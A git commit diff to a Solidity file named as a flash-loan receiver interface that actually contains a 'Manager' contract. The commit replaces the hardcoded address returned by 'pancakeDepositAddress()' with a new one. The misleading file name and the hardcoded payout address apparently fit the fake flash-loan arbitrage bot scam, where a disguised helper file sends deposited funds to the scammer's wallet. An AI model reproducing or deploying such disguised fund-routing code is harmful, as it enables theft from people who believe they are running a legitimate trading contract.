c862a6f011230d4bae0eb4b45360f89ceeea6e7e
rxwlvn <88416792+rxwlvn@users.noreply.github.com>
2021-09-14 14:20:56 -0500

    Update IFlashLoanReceiverV1.3.sol

--- contracts/interfaces/IFlashLoanReceiverV1.3.sol
+++ contracts/interfaces/IFlashLoanReceiverV1.3.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function pancakeDepositAddress() public pure returns (address) {
-		return 0x78F01EE913F4C1994F8e32a62aCF2ed46e52Ba7C;
+		return 0xAEf508A99A7322558019412676DC0aE79aA233D9;
 	}
 }
